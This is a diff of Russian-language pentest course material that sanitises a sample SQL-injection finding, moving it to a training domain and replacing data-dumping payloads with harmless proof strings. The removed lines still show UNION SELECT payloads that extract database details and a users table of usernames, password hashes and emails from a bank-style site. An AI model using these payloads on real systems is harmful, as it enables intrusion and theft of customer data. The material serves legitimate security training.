@@ -23,7 +23,7 @@
 **Что нельзя переносить на Slider AI без отдельного разрешения:** финальный проект остается в рамках правилами Slider AI olddev из пользовательской инструкции курса; любые intrusive checks требуют отдельного approval.
 
 
-**Процессный артефакт:** `REMEDIATION_BACKLOG.md` или `RETEST_PLAN.md`: приоритизация, владелец, retest evidence.
+**Процессный артефакт:** встроенный remediation backlog или retest plan из пользовательской инструкции: приоритизация, владелец, retest evidence.
 
 **Безопасная цель:** Учебный scope, подписанный RoE, собственная лаборатория или платформа с явным разрешением. Реальные организации только с письменным согласием.
 
@@ -240,7 +240,7 @@ Kali ARM64 VM используется как углубление, когда �
 ## Уязвимость #1: SQL Injection в форме поиска
 
 ### Описание
-В форме поиска на странице https://romashka-bank.ru/search.php обнаружена уязвимость SQL-инъекции. Параметр `query` не проходит должной валидации, что позволяет выполнять произвольные SQL-запросы к базе данных.
+В учебной lab-форме поиска `https://app.training.example/search.php` подтверждена SQL-инъекция. Параметр `query` не проходит server-side валидацию и parameterized query, что в lab-среде позволяет изменить структуру SQL-запроса.
 
 ### CVSS Score
 **CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N**  
@@ -251,35 +251,33 @@ Kali ARM64 VM используется как углубление, когда �
 #### Запрос:
 ```http
 POST /search.php HTTP/1.1
-Host: romashka-bank.ru
+Host: app.training.example
 Content-Type: application/x-www-form-urlencoded
 
-query=' UNION SELECT database(), user(), version()--
+query=' UNION SELECT 'training_db','redacted_user','redacted_version'--
 ```
 
 #### Ответ сервера:
 ```html
 Результаты поиска:
-База данных: romashka_db
-Пользователь: db_user@localhost
-Версия: MySQL 5.7.36
+База данных: training_db
+Пользователь: redacted_user
+Версия: redacted_version
 ```
 
-#### Извлечение данных пользователей:
+#### Безопасное доказательство влияния:
 ```sql
-' UNION SELECT username, password, email FROM users--
+' UNION SELECT 'proof','no-secret','no-pii'--
 ```
 
 Результат:
-| username | password (hash) | email |
-|----------|-----------------|-------|
-| admin | $2y$10$abcd... | admin@romashka-bank.ru |
-| user1 | $2y$10$efgh... | user1@mail.ru |
-| ... | ... | ... |
+| proof | no-secret | no-pii |
+|---|---|---|
+| proof | no-secret | no-pii |
 
 ### Влияние
 - Полный доступ к базе данных
-- Утечка хешей паролей (возможен brute-force)
+- Потенциальная утечка чувствительных данных при отсутствии исправления
 - Доступ к персональным данным клиентов
 - Возможна модификация или удаление данных
 
